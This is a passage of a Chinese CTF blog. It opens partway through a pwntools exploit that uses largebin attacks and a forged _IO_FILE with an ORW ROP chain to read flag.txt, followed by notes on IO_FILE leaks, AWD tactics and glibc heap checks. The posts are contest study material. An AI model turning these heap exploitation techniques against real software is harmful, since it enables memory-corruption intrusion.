lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: log.info(x)</span><br><span class="line">db = lambda: gdb.attach(io)</span><br><span class="line">sa(&#x27;mew mew mew~~~~~~&#x27;,&#x27;LOGIN | r00t QWB QWXFadmin&#x27;)</span><br><span class="line">def add(idx,size,cont):</span><br><span class="line">    sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">    sla(&#x27;plz input your cat choice:\n&#x27;,str(1))</span><br><span class="line">    sla(&#x27;plz input your cat idx:\n&#x27;,str(idx))</span><br><span class="line">    sla(&#x27;plz input your cat size:\n&#x27;,str(size))</span><br><span class="line">    sa(&#x27;plz input your content:\n&#x27;,cont)</span><br><span class="line">def delete(idx):</span><br><span class="line">    sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">    sla(&#x27;plz input your cat choice:\n&#x27;, str(2))</span><br><span class="line">    sla(&#x27;plz input your cat idx:\n&#x27;,str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">    sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">    sla(&#x27;plz input your cat choice:\n&#x27;, str(3))</span><br><span class="line">    sla(&#x27;plz input your cat idx:\n&#x27;,str(idx))</span><br><span class="line">def edit(idx,cont):</span><br><span class="line">    sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">    sla(&#x27;plz input your cat choice:\n&#x27;, str(4))</span><br><span class="line">    sla(&#x27;plz input your cat idx:\n&#x27;,str(idx))</span><br><span class="line">    sa(&#x27;plz input your content:\n&#x27;, cont)</span><br><span class="line"></span><br><span class="line">add(0,0x420,&#x27;youlin&#x27;)</span><br><span class="line">add(1,0x430,&#x27;youlin&#x27;)</span><br><span class="line">add(2,0x418,&#x27;youlin&#x27;)</span><br><span class="line">delete(0)</span><br><span class="line">show(0)</span><br><span class="line">libcbase=u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))-0x219ce0  #直接用下面的largebin也可以泄露libc</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">add(3,0x440,&#x27;youlin&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi=libcbase+0x000000000002a3e5</span><br><span class="line">pop_rsi=libcbase+0x000000000002be51</span><br><span class="line">pop_rdx_r12=libcbase+0x000000000011f497</span><br><span class="line">ret=libcbase+0x0000000000029cd6</span><br><span class="line">pop_rax=libcbase+0x0000000000045eb0</span><br><span class="line">stderr=libcbase+libc.sym[&#x27;stderr&#x27;]</span><br><span class="line">setcontext=libcbase+libc.sym[&#x27;setcontext&#x27;]</span><br><span class="line">close=libcbase+libc.sym[&#x27;close&#x27;]</span><br><span class="line">read=libcbase+libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libcbase+libc.sym[&#x27;write&#x27;]</span><br><span class="line">syscallret=libcbase+0x91396</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">io.recvuntil(b&quot;\x7f&quot;)[-6:]#可以通过这里泄露libc,这里可以接收到main_arena+0x1104处的地址</span><br><span class="line">io.recv(10)</span><br><span class="line">heapbase=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x290</span><br><span class="line">print(&quot;heapbase:&quot;+hex(heapbase))</span><br></pre></td></tr></table></figure>

<p>然后就是写模板了，然后通过large bin attack修改stderr为unsorted bin的地址（unsorted bin为伪造的_IO_FILE)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">fake_io=heapbase+0xb00</span><br><span class="line"></span><br><span class="line">fake_IO_FILE = p64(0)*4</span><br><span class="line">fake_IO_FILE +=p64(0)</span><br><span class="line">fake_IO_FILE +=p64(0)</span><br><span class="line">fake_IO_FILE +=p64(1)+p64(0)</span><br><span class="line">fake_IO_FILE +=p64(heapbase+0xc18-0x68)#rdx</span><br><span class="line">fake_IO_FILE +=p64(setcontext+61)#call addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0 )  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heapbase+0x200)  # _lock = writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(heapbase+0xb30) #rax1</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xB0, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _mode = 0</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xC8, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(libcbase+0x2160d0)  # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(0)*6</span><br><span class="line">fake_IO_FILE += p64(heapbase+0xb30+0x10)  # rax2</span><br><span class="line">flagaddr=heapbase+0x17d0 </span><br><span class="line">payload1=fake_IO_FILE+p64(flagaddr)+p64(0)+p64(0)*5+p64(heapbase+0x2050)+p64(ret)#heapbase+0x2050为之后的orw链,flagaddr为之后写入flag.txt的地址，heap_base+0x2050为后面写入orw的地址</span><br><span class="line">delete(2)</span><br><span class="line">add(6,0x418,payload1)</span><br><span class="line">delete(6)</span><br><span class="line"></span><br><span class="line">edit(0,p64(libcbase+0x21a0d0)*2+p64(heapbase+0x290)+p64(stderr-0x20))#first large_bin_attack  设置fd和bk指针指向原来的main_arena+0x1104处，bk_nextsize指向stderr-0x20处,使stderr指向unsorted bin</span><br><span class="line">add(5,0x440,&#x27;youlin&#x27;)</span><br><span class="line">add(7,0x430,&#x27;flag.txt&#x27;)</span><br><span class="line">add(8,0x430,&#x27;youlin&#x27;)</span><br><span class="line">orw=p64(pop_rdi)+p64(0)+p64(close)+p64(pop_rdi)+p64(flagaddr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscallret)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(flagaddr)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read)+p64(pop_rdi)+p64(1)+p64(write)</span><br><span class="line">add(9,0x430,orw)</span><br><span class="line">#dbg()</span><br><span class="line">delete(5)</span><br><span class="line">add(10,0x450,p64(0)+p64(1))</span><br><span class="line">delete(8)</span><br><span class="line">dbg()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://tuchuangs.com/imgs/2022/09/14/4b938f0d3d5ad9cc.png"></p>
<p>最后构造一个largebin attack topchunk size，通过修改top chunk的size去执行__mallo_assert,最终跳转到context执行orw</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># second large bin attack - topchunk&#x27;s size</span><br><span class="line">edit(5,p64(libcbase+0x21a0e0)*2+p64(heapbase+0x1370)+p64(heapbase+0x28e0-0x20+3))</span><br><span class="line">#dbg()</span><br><span class="line">#trigger __malloc_assert</span><br><span class="line">sa(&#x27;mew mew mew~~~~~~&#x27;, &#x27;CAT | r00t QWB QWXF$\xff&#x27;)</span><br><span class="line">sla(&#x27;plz input your cat choice:\n&#x27;,str(1))</span><br><span class="line">sla(&#x27;plz input your cat idx:&#x27;,str(11))</span><br><span class="line">sla(&#x27;plz input your cat size:&#x27;,str(0x450))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/12/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/12/%E5%91%A8%E6%8A%A5%E6%A8%A1%E6%9D%BF/" class="post-title-link" itemprop="url">周报模板</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-09-12 21:40:19 / Modified: 21:42:00" itemprop="dateCreated datePublished" datetime="2022-09-12T21:40:19+08:00">2022-09-12</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="2022年9月第二周周报-幽林"><a href="#2022年9月第二周周报-幽林" class="headerlink" title="2022年9月第二周周报-幽林"></a>2022年9月第二周周报-幽林</h1><h1 id="完成事项"><a href="#完成事项" class="headerlink" title="完成事项"></a>完成事项</h1><p>ciscn华东北和预赛的复现，利用_IO_2_1_stdout_进行任意写和读（利用方法）</p>
<h1 id="未完成事项"><a href="#未完成事项" class="headerlink" title="未完成事项"></a>未完成事项</h1><p>awd的pwn还是没怎么掌握，写批量脚本还有利用ida的keypatch加固pwn题</p>
<h1 id="下周待做事项"><a href="#下周待做事项" class="headerlink" title="下周待做事项"></a>下周待做事项</h1><p>继续研究下awd的pwn（抱抱e4l4师傅大腿），学一学house_of_cat和house_of_apple（希望能学明白）（有时间的话看一看《揭秘家用路由器0day漏洞挖掘技术》）</p>
<h1 id="本周知识分享"><a href="#本周知识分享" class="headerlink" title="本周知识分享"></a>本周知识分享</h1><p>利用io链进行任意读和写</p>
<p>记录给我自己看的一些技巧：<a href="https://wscyoulin.github.io/2022/09/07/io-file%E5%88%A9%E7%94%A8/">https://wscyoulin.github.io/2022/09/07/io-file%E5%88%A9%E7%94%A8/</a></p>
<p>这个手法最终要的是伪造堆块到_IO_2_1_stdout_处，可以通过修改几个值来达到任意读和写的目的</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/26443359/1662907539771-334cd5c0-07c2-494f-b90f-91e458ddc8ab.png" alt="img"></p>
<p>首先需要将flags改为0xfbad1800,然后看情况修改后面的ptr和base，例如如果需要泄露libc可以直接将_IO_read_ptr,_IO_read_end,_IO_read_base=0,_IO_write_base的最后一个字节改为\x00，这样接受就可以直接泄露libc了（具体原理建议去看看hollk师傅写的好好说话系列，或者可以看看leof师傅的博客） </p>
<p>如果需要任意写的话， _io_read_ptr-&gt;malloc_hook，io_read_end-&gt;malloc_hook+0x10，就可以任意往malloc_hook指针处写onegadget  </p>
<p>例题可以看看ciscn华东北的blue，这题是需要利用io泄露出heap_base，后面再往我博客上输出点关于这道题的垃圾吧，还没具体记录这道题</p>
<h1 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h1><p>带带我</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/07/io-file%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">io_file利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-09-07 20:32:27" itemprop="dateCreated datePublished" datetime="2022-09-07T20:32:27+08:00">2022-09-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-09-08 13:50:31" itemprop="dateModified" datetime="2022-09-08T13:50:31+08:00">2022-09-08</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="io-file的利用"><a href="#io-file的利用" class="headerlink" title="io_file的利用"></a>io_file的利用</h1><p>io_file的具体原理在前面已经搬运hollk师傅的文章了，所以就不写了，直接写下io_file的利用姿势</p>
<p>这里就是为了达到泄露libc最终需要调用的</p>
<p><code>_IO_do_write</code>函数三个参数分别为</p>
<p>stdout结构体，缓冲区基址，输出的size</p>
<p>如果将write_base改掉，就能泄露libc的目的了</p>
<p>具体的看这个文章</p>
<p><a target="_blank" rel="noopener" href="https://le0f.github.io/2022/06/14/IO-FILE-leak/">https://le0f.github.io/2022/06/14/IO-FILE-leak/</a></p>
<h2 id="io-file泄露"><a href="#io-file泄露" class="headerlink" title="io_file泄露"></a>io_file泄露</h2><p><img src="https://s2.loli.net/2022/09/07/Ya72qUy91tuFEN6.png" alt="图片.png"></p>
<p>这里面关键的地方是_flags=0xfbad1800 ,_IO_read_ptr=0,_IO_read_end=0,_IO_read_base=0,_io_write_base最低位\x00,就可以泄露出libc了</p>
<p>也可以对_io_write_base直接进行修改，指向想要泄露的地址处，_io_write_ptr=指向的地址+0x8</p>
<h2 id="io-file任意写"><a href="#io-file任意写" class="headerlink" title="io_file任意写"></a>io_file任意写</h2><p>例如：修改_io_read_ptr-&gt;malloc_hook，io_read_end-&gt;malloc_hook+0x10，就可以任意往malloc_hook指针处写onegadget</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/09/04/awd_pwn%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">awd_pwn总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-09-04 16:10:54 / Modified: 16:35:12" itemprop="dateCreated datePublished" datetime="2022-09-04T16:10:54+08:00">2022-09-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="bugku的一场awd自定义赛总结"><a href="#bugku的一场awd自定义赛总结" class="headerlink" title="bugku的一场awd自定义赛总结"></a>bugku的一场awd自定义赛总结</h1><h2 id="首先比赛方会给出自己队伍的靶机ip和ssh端口"><a href="#首先比赛方会给出自己队伍的靶机ip和ssh端口" class="headerlink" title="首先比赛方会给出自己队伍的靶机ip和ssh端口"></a>首先比赛方会给出自己队伍的靶机ip和ssh端口</h2><p><img src="https://s2.loli.net/2022/09/04/L9SfHEJ1urNa4Zo.png" alt="图片.png"></p>
<p>对于其他队伍会给出一个范围的网段（可以用nmap扫出来（不会），也可以用脚本扫出来（嫖了kento师傅的一个脚本））</p>
<h2 id="先用finalshell登上自己的靶机"><a href="#先用finalshell登上自己的靶机" class="headerlink" title="先用finalshell登上自己的靶机"></a>先用finalshell登上自己的靶机</h2><p><img src="https://s2.loli.net/2022/09/04/t1zbYpiGcSaZ9Wv.png" alt="图片.png"></p>
<p>登上之后是类似上面这张图片这样的，可以找到有一个pwn题(自己靶机的pwn题和别人靶机上的题目是一样的，除非别人进行了加固)，可以先下载下来并且顺便还可以查看一下靶机的libc版本（strings libc.so.6|grep GNU)切换到libc的目录看下对应的小版本都可以的。</p>
<h2 id="pwn进攻思路"><a href="#pwn进攻思路" class="headerlink" title="pwn进攻思路"></a>pwn进攻思路</h2><p>先写下对应pwn的exp（记得在自己的机器上patchelf一下对应的libc版本，不然容易出问题），然后确保本机可以打通后，切换对应的ip和端口去拿flag，对应的端口需要拿nmap扫描出来nmap -F ip（可以先扫自己的靶机，对应的端口是一样的）据说可以写批量攻击的脚本（但是不会，后面学会了再回来补充下）</p>
<h2 id="pwn防守思路"><a href="#pwn防守思路" class="headerlink" title="pwn防守思路"></a>pwn防守思路</h2><p>使用ida(keypatch插件)对一些明显的漏洞函数进行加固（修改），然后上传靶机可以直接覆盖掉之前的题目。</p>
<p>推荐看这个文章：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1706950008032297634&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1706950008032297634&amp;wfr=spider&amp;for=pc</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/08/28/debug%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9/" class="post-title-link" itemprop="url">debug信息修改</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-08-28 22:02:58 / Modified: 22:10:59" itemprop="dateCreated datePublished" datetime="2022-08-28T22:02:58+08:00">2022-08-28</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="记录一个pwn常用技巧-修改debug"><a href="#记录一个pwn常用技巧-修改debug" class="headerlink" title="记录一个pwn常用技巧-修改debug"></a>记录一个pwn常用技巧-修改debug</h1><p>一般来说是用在本身提供的pwn题已经patchelf好了libc，并且将ld和libc.so.6都已经提供。但是如果本身虚拟机的版本和题目的版本不一样，那么调试的时候会看不了堆块啥的</p>
<h2 id="首先需要先将ld和libc-so-6给权限"><a href="#首先需要先将ld和libc-so-6给权限" class="headerlink" title="首先需要先将ld和libc.so.6给权限"></a>首先需要先将ld和libc.so.6给权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 libc.so.6</span><br><span class="line">chmod 777 ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure>

<h2 id="然后在glibc-all-in-one里面找到对应的libc版本"><a href="#然后在glibc-all-in-one里面找到对应的libc版本" class="headerlink" title="然后在glibc all in one里面找到对应的libc版本"></a>然后在glibc all in one里面找到对应的libc版本</h2><p>在debs里面找到这个.build-id（注意是个隐藏文件）</p>
<p>将他提取到主目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/lib/debug</span><br><span class="line">sudo mv .build-id/ .build-id.bak</span><br><span class="line">cd ~</span><br><span class="line">sudo mv ~/.build-id/ /usr/lib/debug</span><br></pre></td></tr></table></figure>

<p>现在就可以正常调试pwn题了</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/08/22/house-of-banana/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/08/22/house-of-banana/" class="post-title-link" itemprop="url">house_of_banana</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-08-22 16:21:13" itemprop="dateCreated datePublished" datetime="2022-08-22T16:21:13+08:00">2022-08-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-08-24 22:45:14" itemprop="dateModified" datetime="2022-08-24T22:45:14+08:00">2022-08-24</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="新版glibc的改进"><a href="#新版glibc的改进" class="headerlink" title="新版glibc的改进"></a>新版glibc的改进</h1><p>从glibc 2.28开始，增加了对unsorted bin的bk检验，使得unsorted bin attack不再可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br></pre></td></tr></table></figure>

<p>此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (size &lt;= 2 * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely (chunksize_nomask (next) &lt; 2 * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">  malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">if (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">  malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br></pre></td></tr></table></figure>

<p>但是幸运的是large bin attack仍然可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">          == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                    /* Always insert in the second position.  */</span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">                      victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure>

<p>然而从glibc 2.30开始，常规large bin attack方法也被封堵</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if ((unsigned long) size</span><br><span class="line">            == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                      /* Always insert in the second position.  */</span><br><span class="line">                      fwd = fwd-&gt;fd;</span><br><span class="line">                    else</span><br><span class="line">                      &#123;</span><br><span class="line">                        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                          malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">                        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                      &#125;</span><br><span class="line">                    bck = fwd-&gt;bk;</span><br><span class="line">                    if (bck-&gt;fd != fwd)</span><br><span class="line">                      malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="0x03-large-bin-attack在新版glibc中的利用"><a href="#0x03-large-bin-attack在新版glibc中的利用" class="headerlink" title="0x03 large bin attack在新版glibc中的利用"></a>0x03 large bin attack在新版glibc中的利用</h2><p>那是否意味着large bin attack不能用了呢，其实不是，以前的large bin attack手法，都是在下面第二个分支里进行</p>
<p><img src="https://p3.ssl.qhimg.com/t011197cbed4f5d1848.png" alt="img"></p>
<p>在最新版的glibc 2.32里，我们看到，第二个分支里确实封堵了以前的利用手法，但是在第一个分支里，仍然可以实现large bin attack，但是该分支利用起来，只是完成<strong>往任意地址写一个堆地址</strong>的作用，因为这里的<code>bck-&gt;bk</code>才是我们的large bin，因此分析来看，我们能够控制的也就是图中第一个分支中的<code>fwd-&gt;fd-&gt;bk_nextsize</code>，而完成写的操作是在<code>fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 这句中，即可以往任意地址写上这个unsorted bin chunk堆的地址。而以前旧版large bin attack是可以往<strong>任意的两个地址写两个堆地址</strong>。（摘抄自安全客）</p>
